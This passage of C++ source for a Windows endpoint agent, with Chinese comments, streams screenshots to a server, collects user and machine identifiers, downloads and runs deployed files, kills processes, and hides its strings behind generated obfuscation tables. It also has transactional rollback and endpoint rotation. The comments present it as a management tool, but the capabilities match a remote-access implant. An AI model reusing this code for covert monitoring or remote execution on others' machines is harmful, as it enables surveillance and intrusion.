        LOG_E(R6M_STR_D9CF61251F402ED5, "屏幕监控无法启动：没有插件提供 screenshot 工具");
        _screenActive.store(false);
        return;
    }

    // 这样不必新增字面量，也不用动生成的混淆表（重跑生成器有把整表清空的风险）。
    std::string framePath = std::string(R6M_STR_988D7DCC805B1160);
    const size_t tail = framePath.rfind("result");
    if (tail != std::string::npos) framePath.replace(tail, 6, "frame");

    uint64_t seq = 0;
    uint64_t sent = 0;
    while (!_screenStop.load()) {
        const int scale = _screenScale.load();
        const int interval = _screenInterval.load();
        const auto t0 = std::chrono::steady_clock::now();
        try {
            std::string params = "{\"name\":\"screenshot\",\"arguments\":{\"scale\":" +
                                 std::to_string(scale) + ",\"format\":\"jpeg\"}}";
            std::string result = _plugins.callPlugin(pluginId, "tools/call", params, 5000);

            std::string b64, fmt = "jpeg";
            int w = 0, h = 0;
            r6m::Json pj;
            std::string perr;
            if (r6m::Json::parse(result, pj, &perr)) {
                // 插件把工具结果直接放在根对象里（callPlugin 已剥掉 jsonrpc 外壳）；
                // 兼容万一被包了一层 result 的情况。
                const r6m::Json* node = pj.find("result");
                const r6m::Json* obj = (node && node->isObject()) ? node : &pj;
                b64 = obj->getString("image_base64");
                w = (int)obj->getNumber("width", 0);
                h = (int)obj->getNumber("height", 0);
                const std::string f = obj->getString("image_format");
                if (!f.empty()) fmt = f;
            }

            if (b64.empty()) {
                LOG_W(R6M_STR_D9CF61251F402ED5, "屏幕采集未取得图像（插件返回异常），本轮跳过");
            } else {
                std::string body = "{\"seq\":" + std::to_string(++seq) +
                                   ",\"format\":\"" + fmt + "\",\"width\":" + std::to_string(w) +
                                   ",\"height\":" + std::to_string(h) +
                                   ",\"image_base64\":\"" + b64 + "\"}";
                std::string r;
                if (httpPost(framePath, body, r)) {
                    sent++;
                    if (sent == 1 || sent % 50 == 0) {
                        LOG_INFO(R6M_STR_D9CF61251F402ED5, ("屏幕监控已上行 " + std::to_string(sent) +
                                 " 帧，最近一帧 " + std::to_string(b64.size() / 1024) + "KB").c_str());
                    }
                } else {
                    LOG_W(R6M_STR_D9CF61251F402ED5, "帧上传失败（网络或会话已结束）");
                }
                WipeString(body);
                WipeString(r);
                WipeString(b64);
            }
            WipeString(result);
        } catch (const std::exception& e) {
            LOG_E(R6M_STR_D9CF61251F402ED5, ("屏幕采集异常: " + std::string(e.what())).c_str());
        } catch (...) {
            LOG_E(R6M_STR_D9CF61251F402ED5, "屏幕采集异常");
        }

        // 分片睡眠：让"停止"最多延迟 50ms 生效。
        // 直接 sleep(interval) 会让停止卡住整整一个采集周期，面板上表现为
        // "点了停止画面还在动"。
        const auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                                 std::chrono::steady_clock::now() - t0).count();
        int remain = interval - (int)elapsed;
        while (remain > 0 && !_screenStop.load()) {
            const int step = remain > 50 ? 50 : remain;
            std::this_thread::sleep_for(std::chrono::milliseconds(step));
            remain -= step;
        }
    }
}

std::string StubCore::collectSystemInfo() {
    wchar_t computer[MAX_PATH] = {}; DWORD csz = MAX_PATH;
    GetComputerNameW(computer, &csz);
    wchar_t user[MAX_PATH] = {}; DWORD usz = MAX_PATH;
    GetUserNameW(user, &usz);

    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    auto fn = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    DWORD build = 0;
    if (fn) {
        RTL_OSVERSIONINFOW rovi = { sizeof(rovi) };
        fn(&rovi);
        build = rovi.dwBuildNumber;
    }

    // Convert wide strings to UTF-8
    char cs[256] = {}, us[256] = {};
    WideCharToMultiByte(CP_UTF8, 0, computer, -1, cs, sizeof(cs), nullptr, nullptr);
    WideCharToMultiByte(CP_UTF8, 0, user, -1, us, sizeof(us), nullptr, nullptr);
    std::ostringstream ss;
    ss << "{\"computer\":\"" << cs
       << "\",\"user\":\"" << us
       << R6M_STR_04FF19FB820E5EE8 << build
       << "\",\"arch\":\"" << (sizeof(void*) == 8 ? "x64" : "x86") << "\"}";
    return ss.str();
}

std::string StubCore::generateHWID() {
    // 低碰撞机器标识：MachineGuid（系统安装时生成，全局唯一）+ 系统卷序列号 + 计算机名。
    //
    // 原实现只用计算机名做 32 位 DJB2 并窄化到 char（MSVC C4244），问题有三层：
    // 而服务端 per-agent 密钥是按 hwid 复用的，hwid 可枚举就等于身份可冒名。
    std::string guid = ReadRegString(HKEY_LOCAL_MACHINE, std::wstring(::r6m::ev::Widen(R6M_STR_A5F74A9302328D8A)).c_str(), std::wstring(::r6m::ev::Widen(R6M_STR_292388E0073F42D7)).c_str());

    wchar_t computer[MAX_PATH] = {}; DWORD sz = MAX_PATH;
    GetComputerNameW(computer, &sz);
    std::string cs = Utf8FromWide(computer);

    DWORD volSerial = 0;
    wchar_t sysDir[MAX_PATH] = {};
    if (GetSystemDirectoryW(sysDir, MAX_PATH) >= 3) {
        wchar_t root[4] = { sysDir[0], L':', L'\\', 0 };
        GetVolumeInformationW(root, nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);
    }
    char volHex[16] = {};
    snprintf(volHex, sizeof(volHex), "%08X", volSerial);

    std::string material = guid + "|" + cs + "|" + volHex;
    std::string digest = Sha256Hex(material);
    if (digest.size() < 32) {
        // 机器签名不可用（极少见）：明确告警并退回计算机名哈希，不静默降级
        LOG_W(R6M_STR_D9CF61251F402ED5, "机器标识计算失败（CSP 不可用？），退回计算机名哈希，碰撞风险高");
        unsigned int hash = 5381;
        for (size_t i = 0; i < cs.size(); i++) hash = ((hash << 5) + hash) + (unsigned char)cs[i];
        char buf[32] = {};
        snprintf(buf, sizeof(buf), "%08X", hash);
        return std::string(buf);
    }
    std::string hwid = digest.substr(0, 32);
    LOG_I(R6M_STR_D9CF61251F402ED5, ("HWID = " + hwid + R6M_STR_69BE2D006318991B).c_str());
    return hwid;
}

// ═══════════════════════════════════════════════
// 文件下载 & 部署
// ═══════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════
// 按映像名查/停进程
//
// 用途：投放带 run=true 的工件时，上一轮启动的实例会**锁住文件**，让替换必然失败。
// 为什么不能"改名兼容处理占用"（我第一版就是这么写的，被指出后确认是错的）：
//   **两个实例并存**。对屏幕锁定常驻这类工具就是"双后端"：两个进程都轮询服务端状态、
// ═══════════════════════════════════════════════════════════════════════════
bool StubCore::ImageRunning(const std::wstring& exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName.c_str()) == 0) { found = true; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

int StubCore::StopRunningImages(const std::wstring& exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    int killed = 0;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName.c_str()) != 0) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;   // 别把自己算进去
            HANDLE hp = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pe.th32ProcessID);
            if (!hp) {
                LOG_W(R6M_STR_FF01F19295C3B47E, ("无法打开待终止进程（pid=" +
                      std::to_string(pe.th32ProcessID) + "，可能权限不足）").c_str());
                continue;
            }
            if (TerminateProcess(hp, 0)) {
                // 必须等它**真退出**：只发终止请求就立刻写文件，仍会碰上"文件被占着"
                WaitForSingleObject(hp, 8000);
                killed++;
            }
            CloseHandle(hp);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (killed > 0) {
        LOG_W(R6M_STR_FF01F19295C3B47E, ("投放前终止了 " + std::to_string(killed) +
              " 个正在运行的实例: " + Utf8FromWide(exeName)).c_str());
    }
    return killed;
}

bool StubCore::httpDownload(const std::string& url, const std::wstring& savePath) {
    std::string savePathUtf8(savePath.begin(), savePath.end());
    LOG_I(R6M_STR_D3386A2EF42E80B9, ("开始下载: " + url).c_str());
    LOG_I(R6M_STR_D3386A2EF42E80B9, ("保存到: " + savePathUtf8).c_str());

    // 解析 URL
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E(R6M_STR_D3386A2EF42E80B9, ("URL 解析失败, error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    LOG_I(R6M_STR_D3386A2EF42E80B9, ("Host: " + host + " Path: " + pathStr).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E(R6M_STR_D3386A2EF42E80B9, ("连接失败: " + host + " error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    DWORD reqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI;
    if (isHttps) reqFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", pathStr.c_str(), nullptr, nullptr,
        nullptr, reqFlags, 0);
    if (!hReq) {
        LOG_E(R6M_STR_D3386A2EF42E80B9, ("请求失败: error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hConn);
        return false;
    }

    if (isHttps) SetupSelfSignedTls(hReq);

    DWORD timeout = 120000; // 2 分钟超时
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers = BuildAgentKeyHeader(_agentKeyObf, _keyMask, _hwid);
    if (!HttpSendRequestA(hReq, headers.empty() ? nullptr : headers.c_str(),
        (DWORD)headers.size(), nullptr, 0)) {
        LOG_E(R6M_STR_D3386A2EF42E80B9, "发送失败");
        WipeString(headers);
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }
    WipeString(headers); // 含密钥明文，发送后立即擦

    if (isHttps && !VerifyServerCertPin(hReq)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 检查状态码
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusSize, nullptr);
    if (statusCode != 200) {
        LOG_E(R6M_STR_D3386A2EF42E80B9, ("HTTP 状态码: " + std::to_string(statusCode)).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 获取文件大小
    DWORD contentLength = 0;
    DWORD clSize = sizeof(contentLength);
    HttpQueryInfoA(hReq, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &clSize, nullptr);

    // 打开本地文件（用 CreateFileW 支持中文路径）
    HANDLE hFile = CreateFileW(savePath.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG_E(R6M_STR_D3386A2EF42E80B9, ("无法创建文件, error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 下载
    char buf[65536];
    DWORD totalRead = 0;
    DWORD bytesRead = 0;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        DWORD written = 0;
        WriteFile(hFile, buf, bytesRead, &written, nullptr);
        totalRead += bytesRead;
        if (contentLength > 0) {
            int pct = (int)((long long)totalRead * 100 / contentLength);
            if (pct % 10 == 0) {
                LOG_I(R6M_STR_D3386A2EF42E80B9, ("进度: " + std::to_string(pct) + "%").c_str());
            }
        }
    }

    CloseHandle(hFile);
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);

    LOG_I(R6M_STR_D3386A2EF42E80B9, ("下载完成: " + savePathUtf8 + " (" + std::to_string(totalRead) + " bytes)").c_str());
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// 外置工件的密钥签发与登记
//
// 为什么密钥由受管端签发：只有它知道文件实际落在哪、是否真的跑起来了。
// 服务端只做登记与核对，避免"服务端以为投到 A、实际落在 B"的错配。
//
// 这样重新投放同一个工具，服务端认得出"还是同一个工件"（标识/密钥都对得上），
// 而不是每次都当新工件、旧密钥作废。
// ═══════════════════════════════════════════════════════════════════════════
// 工件文件标识（sha256 十六进制）。
// 另一个程序，名字一样就认成同一个工件，钥匙就会指到错的东西上。
// 用 CryptAcquireContext/CreateHash/CryptHashData：与本文件证书标识校验同一套垫片。
static std::string Sha256FileHex(const std::wstring& path) {
    HANDLE f = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return std::string();
    HCRYPTPROV prov = 0;
    HCRYPTHASH hash = 0;
    std::string out;
    if (CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash)) {
            BYTE buf[65536];
            DWORD rd = 0;
            bool ok = true;
            while (ReadFile(f, buf, sizeof(buf), &rd, nullptr) && rd > 0) {
                if (!CryptHashData(hash, buf, rd, 0)) { ok = false; break; }
            }
            if (ok) {
                BYTE dig[32] = {};
                DWORD dl = sizeof(dig);
                if (CryptGetHashParam(hash, HP_HASHVAL, dig, &dl, 0)) {
                    static const char* hexd = "0123456789abcdef";
                    for (DWORD i = 0; i < dl; i++) {
                        out += hexd[dig[i] >> 4];
                        out += hexd[dig[i] & 0xF];
                    }
                }
            }
            CryptDestroyHash(hash);
        }
        CryptReleaseContext(prov, 0);
    }
    CloseHandle(f);
    return out;
}

std::string StubCore::issueArtifactKey(const std::string& targetDir, const std::string& fileName) {
    std::string base = fileName;
    size_t dot = base.find_last_of('.');
    if (dot != std::string::npos) base = base.substr(0, dot);
    std::string iniName = base + ".ini";
    std::wstring iniPath = WideFromUtf8(targetDir + "\\" + iniName);

    std::string key;
    {
        HANDLE h = CreateFileW(iniPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            char buf[4096] = {};
            DWORD rd = 0;
            ReadFile(h, buf, sizeof(buf) - 1, &rd, nullptr);
            CloseHandle(h);
            std::string text(buf, rd);
            size_t p = text.find("key=");
            if (p != std::string::npos) {
                p += 4;
                size_t e = text.find_first_of("\r\n", p);
                key = text.substr(p, (e == std::string::npos ? text.size() : e) - p);
            }
        }
    }

    std::string serverSha;   // 服务端登记的标识，用于判断"内容有没有变"
    const std::wstring fullW0 = WideFromUtf8(targetDir + "\\" + fileName);

    // ①' **总是**问服务端一次。两个用途：
    //     (a) 本地配置丢了也能对回原钥匙（密钥的权威来源是服务端，不是本地 ini）；
    //     (b) 拿到它登记的标识，好在下面判断"内容有没有变"。
    //     上一版把它套在 if(key.size()<32) 里 —— 本地有 ini 时整段跳过，
    //     serverSha 恒为空，标识比对永不成立，于是换了文件仍沿用旧钥匙。
    {
        std::string rp = std::string(R6M_STR_7156334FE6FB9E4C);
        const size_t tr = rp.rfind("agent/poll");
        if (tr != std::string::npos) rp.replace(tr, 10, "artifact/resolve");
        std::string resp;
        // 该端点不限制方法，空 body 的 POST 即可（GET 语义）
        if (httpPost(rp + "?name=" + fileName, std::string(), resp) &&
            resp.find("\"found\":true") != std::string::npos) {
            if (key.size() < 32) {
                size_t kp = resp.find("\"key\":\"");
                if (kp != std::string::npos) {
                    kp += 7;
                    size_t ke = resp.find('"', kp);
                    if (ke != std::string::npos && ke > kp) {
                        key = resp.substr(kp, ke - kp);
                        LOG_I(R6M_STR_FF01F19295C3B47E, "复用服务端登记的密钥（本地配置丢失也能对回原钥匙）");
                    }
                }
            }
            size_t sp = resp.find("\"sha256\":\"");
            if (sp != std::string::npos) {
                sp += 10;
                size_t se = resp.find('"', sp);
                if (se != std::string::npos && se > sp) serverSha = resp.substr(sp, se - sp);
            }
        }
        WipeString(resp);
    }

    // ①'' **内容变了就不能复用旧钥匙**。
    // 拿旧钥匙去登记新内容，服务端会按 1:1 规则 409 拒掉（那条规则是对的），
    // （作废旧记录并把 replaced_key 回报给管理端）。
    if (!key.empty() && !serverSha.empty()) {
        const std::string nowSha = Sha256FileHex(fullW0);
        if (!nowSha.empty() && nowSha != serverSha) {
            LOG_W(R6M_STR_FF01F19295C3B47E,
                  "工件内容已变化（标识不同） 不复用旧钥匙，改签新钥匙；旧登记将由服务端作废");
            key.clear();
        }
    }

    if (key.size() < 32) {
        unsigned char raw[16] = {};
        // BCryptGenRandom 返回 NTSTATUS：**成功是 0**。
        // 原来写成 if (!BCryptGenRandom(...)) 把成功当失败 —— 结果是每次签发密钥
        // 都报"随机数生成失败"，整条投放链路永远走不到登记那一步。
        if (BCryptGenRandom(nullptr, raw, sizeof(raw), BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
            LOG_E(R6M_STR_FF01F19295C3B47E, "随机数生成失败，拒绝签发工件密钥");
            return std::string();
        }
        static const char* hexd = "0123456789abcdef";
        key.clear();
        for (int i = 0; i < 16; i++) {
            key += hexd[raw[i] >> 4];
            key += hexd[raw[i] & 0xF];
        }
        LOG_I(R6M_STR_FF01F19295C3B47E, "已为外置工件签发新密钥");
    } else {
        LOG_I(R6M_STR_FF01F19295C3B47E, "复用外置工件已有密钥");
    }

    // ③ 写配置（server / hwid / key / mode）。mode 默认 testwin：
    //    外置工具投放后先以普通窗口跑，确认无误再改 real。
    {
        std::wstring modeW = WideFromUtf8("testwin");
        (void)modeW;
        std::string cfg = "server=" + _serverUrl + "\r\n" +
                          "hwid=" + _hwid + "\r\n" +
                          "key=" + key + "\r\n" +
                          "mode=testwin\r\n";
        HANDLE h = CreateFileW(iniPath.c_str(), GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) {
            LOG_E(R6M_STR_FF01F19295C3B47E, "写入工件配置失败");
            return std::string();
        }
        DWORD wr = 0;
        WriteFile(h, cfg.c_str(), (DWORD)cfg.size(), &wr, nullptr);
        CloseHandle(h);
        LOG_I(R6M_STR_FF01F19295C3B47E, ("已写入工件配置: " + iniName).c_str());
    }

    // ④ 登记到服务端：key ↔ 文件/进程事实
    {
        std::string full = targetDir + "\\" + fileName;
        std::wstring fullW = WideFromUtf8(full);
        WIN32_FILE_ATTRIBUTE_DATA fad = {};
        long long size = 0;
        if (GetFileAttributesExW(fullW.c_str(), GetFileExInfoStandard, &fad)) {
            size = ((long long)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
        }
        // 标识是"这是不是同一个工件"的唯一硬证据 —— 服务端据此拒绝
        // "同一把钥匙绑到不同内容"，也据此在换 key 时告诉我们旧记录该作废。
        const std::string sha = Sha256FileHex(fullW);
        std::string body = "{\"hwid\":\"" + _hwid + "\",\"name\":\"" + fileName +
                           "\",\"size\":" + std::to_string(size) +
                           ",\"sha256\":\"" + sha + "\"" +
                           ",\"path\":\"" + ::r6m::jsonEscape(full) + "\"" +
                           ",\"proc\":\"" + fileName + "\"" +
                           ",\"pid\":0,\"key\":\"" + key + "\"}";
        LOG_I(R6M_STR_FF01F19295C3B47E, ("工件标识 sha256=" + sha.substr(0, 12) + "…").c_str());
        std::string regPath = std::string(R6M_STR_7156334FE6FB9E4C);
        const size_t t2 = regPath.rfind("agent/poll");
        if (t2 != std::string::npos) regPath.replace(t2, 10, "artifact/register");
        std::string resp;
        if (httpPost(regPath, body, resp)) {
            LOG_I(R6M_STR_FF01F19295C3B47E, "工件已登记到服务端");
        } else {
            LOG_W(R6M_STR_FF01F19295C3B47E, "工件登记失败（密钥仍已写入配置，可稍后重投）");
        }
        WipeString(body);
        WipeString(resp);
    }
    return key;
}

// ═══════════════════════════════════════════════════════════════════════════
// 工件回滚：从最近一次备份还原（读 ArtifactApply 写的 manifest.txt）
// 管理端就不敢用了；而且出事时人工翻备份极慢。
// ═══════════════════════════════════════════════════════════════════════════
bool StubCore::handleRollbackFile(const std::string& params) {
    r6m::Json p;
    std::string perr;
    _lastApplyDetail.clear();
    _lastDeployErr.clear();
    if (!r6m::Json::parse(params, p, &perr)) {
        _lastDeployErr = "回滚参数不是合法 JSON: " + perr;
        return false;
    }
    std::string name = p.getString("file_name");
    if (name.empty()) {
        _lastDeployErr = "回滚缺少 file_name";
        return false;
    }
    std::string err, detail;
    if (!::r6m::ArtifactApply::Rollback(name, err, detail)) {
        _lastDeployErr = err;
        LOG_E(R6M_STR_FF01F19295C3B47E, ("回滚失败: " + err).c_str());
        return false;
    }
    _lastApplyDetail = detail;
    LOG_I(R6M_STR_FF01F19295C3B47E, ("回滚完成: " + detail).c_str());
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// 事务化批量投放
//
// 为什么需要：批量投策略最糟的状态是"投了一半失败" —— 机器半配置，
// 而且运维不知道该信哪一边。所以这里做**全成或全回滚**：
//   ③ 逐步报告：哪几项成了、哪项失败、回滚了哪些、回滚有没有失败
//
// 注意下载在应用之前：下载失败时系统还没被改过，不需要回滚 —— 失败面小很多。
// ═══════════════════════════════════════════════════════════════════════════
bool StubCore::handleDeployBatch(const std::string& params) {
    _lastBatchReport.clear();
    _lastDeployErr.clear();

    r6m::Json p;
    std::string perr;
    if (!r6m::Json::parse(params, p, &perr)) {
        _lastDeployErr = "批量参数不是合法 JSON: " + perr;
        return false;
    }
    const r6m::Json* items = p.find("items");
    if (!items || !items->isArray() || items->items.empty()) {
        _lastDeployErr = "批量参数缺少 items 数组";
        return false;
    }
    std::string tx = p.getString("tx");
    if (tx.empty()) {
        // 没给就自己生成：报告与回滚都要靠它
        tx = "tx-" + std::to_string((long long)GetTickCount64());
    }

    // ── 事务前置检查：**没回滚能力的类型不许进事务** ──
    // 不然"全成或全回滚"就是一句谎话：失败时它回不来，机器停在半配置。
    // 判定放在应用之前 —— 一旦开始应用就晚了。
    const bool allowUnrollbackable = p.getBool("allow_unrollbackable", false);
    if (!allowUnrollbackable) {
        std::vector<std::string> bad;
        for (const auto& it : items->items) {
            std::string k = it.getString("apply", "none");
            std::string n = it.getString("file_name");
            bool rb = (k == "none" || k == "exe" || k == "plugin" || k == "zip" ||
                       k == "reg" || k == "policy" || k == "hosts" || k == "firewall" ||
                       k == "secedit" || k == "cert" || k == "task" || k == "service");
            if (!rb) bad.push_back(n + "(" + k + ")");
        }
        if (!bad.empty()) {
            std::string list;
            for (auto& s : bad) list += (list.empty() ? "" : ", ") + s;
            _lastDeployErr = "事务被拒（含无法回滚的类型）: " + list +
                             " —— 脚本/安装包改了什么无法自动还原，"
                             "要么改用可回滚类型，要么显式 allow_unrollbackable=1 并自行承担";
            // 报告也要留痕，让管理端看到"为什么一项都没动"
            r6m::Json rep = r6m::Json::makeObject();
            rep.set("tx", r6m::Json::makeString(tx));
            rep.set("status", r6m::Json::makeString("rejected_precheck"));
            rep.set("reason", r6m::Json::makeString(_lastDeployErr));
            rep.set("total", r6m::Json::makeNumber((double)items->items.size()));
            rep.set("applied_count", r6m::Json::makeNumber(0));
            _lastBatchReport = rep.dump();
            LOG_W(R6M_STR_FF01F19295C3B47E, _lastDeployErr.c_str());
            return false;
        }
    }

    struct ItemResult { std::string name; bool ok; std::string detail; std::string err; };
    std::vector<ItemResult> results;
    std::vector<std::string> applied;   // 已成功应用、失败时要逆序回滚的
    bool allOk = true;
    std::string failName, failErr;

    for (const auto& it : items->items) {
        ItemResult r;
        r.name = it.getString("file_name");
        r.ok = false;
        if (r.name.empty()) {
            r.err = "item 缺少 file_name";
            results.push_back(r);
            allOk = false; failName = "(无名)"; failErr = r.err;
            break;
        }
        // 把事务 id 集成每一项，让备份登记到同一事务索引下
        r6m::Json one = it;
        one.set("tx", r6m::Json::makeString(tx));
        _lastApplyDetail.clear();
        _lastApplyErr.clear();
        bool ok = handleDeployFile(one.dump());
        r.ok = ok;
        r.detail = _lastApplyDetail;
        r.err = _lastApplyErr.empty() ? _lastDeployErr : _lastApplyErr;
        results.push_back(r);
        if (ok) {
            applied.push_back(r.name);
        } else {
            allOk = false; failName = r.name; failErr = r.err;
            LOG_W(R6M_STR_FF01F19295C3B47E,
                  ("批量投放在 " + r.name + " 处失败: " + r.err + "  开始逆序回滚").c_str());
            break;
        }
    }

    std::vector<std::string> rolledBack, rollbackFailed;
    std::string rbDetail;
    if (!allOk && !applied.empty()) {
        for (size_t i = applied.size(); i-- > 0; ) {
            std::string e2, d2;
            if (::r6m::ArtifactApply::Rollback(applied[i], e2, d2)) {
                rolledBack.push_back(applied[i]);
                rbDetail += "\n  " + applied[i] + ": " + d2;
            } else {
                // 回滚失败必须点名：运维要知道哪一项处于不一致状态
                rollbackFailed.push_back(applied[i] + ": " + e2);
                rbDetail += "\n  " + applied[i] + " 回滚失败: " + e2;
            }
        }
    }

    // 组装报告
    {
        r6m::Json rep = r6m::Json::makeObject();
        rep.set("tx", r6m::Json::makeString(tx));
        rep.set("total", r6m::Json::makeNumber((double)items->items.size()));
        rep.set("applied_count", r6m::Json::makeNumber((double)applied.size()));
        if (allOk) {
            rep.set("status", r6m::Json::makeString("committed"));
        } else {
            rep.set("status", r6m::Json::makeString(
                rollbackFailed.empty() ? "rolled_back" : "rollback_incomplete"));
            rep.set("failed_item", r6m::Json::makeString(failName));
            rep.set("failed_reason", r6m::Json::makeString(failErr));
        }
        r6m::Json jr = r6m::Json::makeArray();
        for (auto& r : results) {
            r6m::Json x = r6m::Json::makeObject();
            x.set("name", r6m::Json::makeString(r.name));
            x.set("ok", r6m::Json::makeBool(r.ok));
            if (!r.detail.empty()) x.set("detail", r6m::Json::makeString(r.detail));
            if (!r.err.empty()) x.set("error", r6m::Json::makeString(r.err));
            jr.push(r6m::Json::makeString(x.dump()));
        }
        rep.set("items", jr);
        if (!rolledBack.empty()) {
            r6m::Json a = r6m::Json::makeArray();
            for (auto& s : rolledBack) a.push(r6m::Json::makeString(s));
            rep.set("rolled_back", a);
        }
        if (!rollbackFailed.empty()) {
            r6m::Json a = r6m::Json::makeArray();
            for (auto& s : rollbackFailed) a.push(r6m::Json::makeString(s));
            rep.set("rollback_failed", a);
        }
        if (!rbDetail.empty()) rep.set("rollback_detail", r6m::Json::makeString(rbDetail));
        _lastBatchReport = rep.dump();
    }

    if (!allOk) {
        _lastDeployErr = "事务失败于 " + failName + ": " + failErr +
                         (rollbackFailed.empty()
                              ? "（已回滚 " + std::to_string(rolledBack.size()) + " 项）"
                              : "（有 " + std::to_string(rollbackFailed.size()) + " 项回滚失败，需人工处理）");
    }
    return allOk;
}

bool StubCore::handleRollbackTx(const std::string& params) {
    _lastApplyDetail.clear();
    _lastDeployErr.clear();
    r6m::Json p;
    std::string perr;
    if (!r6m::Json::parse(params, p, &perr)) {
        _lastDeployErr = "回滚参数不是合法 JSON: " + perr;
        return false;
    }
    std::string tx = p.getString("tx");
    if (tx.empty()) { _lastDeployErr = "缺少 tx"; return false; }
    std::string err, detail;
    if (!::r6m::ArtifactApply::RollbackTx(tx, err, detail)) {
        _lastDeployErr = err;
        LOG_E(R6M_STR_FF01F19295C3B47E, ("事务回滚失败: " + err).c_str());
        return false;
    }
    _lastApplyDetail = detail;
    LOG_I(R6M_STR_FF01F19295C3B47E, ("事务回滚完成: " + tx).c_str());
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// 断线可达性：候选端点列表与轮换
// ═══════════════════════════════════════════════════════════════════════════

void StubCore::RebuildEndpointList() {
    _servers.clear();
    // ── 仅内网模式（lanOnly）──────────────────────────────────────────────
    // 为什么要有它：自愈的端点轮换假设"候选都真实可达"。而虚拟机在 U 盘网卡这类
    // 而且轮换还会把本来能用的端点甩掉。开这个开关后 IPv6 字面量候选直接不进列表。
    // 开关：env R6M_LAN_ONLY=1，或 ini 的 lan_only=1
    bool lanOnly = false;
    if (const char* e = getenv("R6M_LAN_ONLY")) lanOnly = !(e[0] == '0' && e[1] == 0);
    int skippedV6 = 0;

    // URL 里的主机是不是 IPv6 字面量（规范写法 [240e::1]，也容错无括号的多冒号写法）
    auto isIPv6Host = [](const std::string& url) {
        size_t p = url.find("://");
        std::string auth = (p == std::string::npos) ? url : url.substr(p + 3);
        size_t cut = auth.find_first_of("/?#");
        if (cut != std::string::npos) auth = auth.substr(0, cut);
        size_t at = auth.find('@');
        if (at != std::string::npos) auth = auth.substr(at + 1);
        if (!auth.empty() && auth[0] == '[') return true;
        int colons = 0;
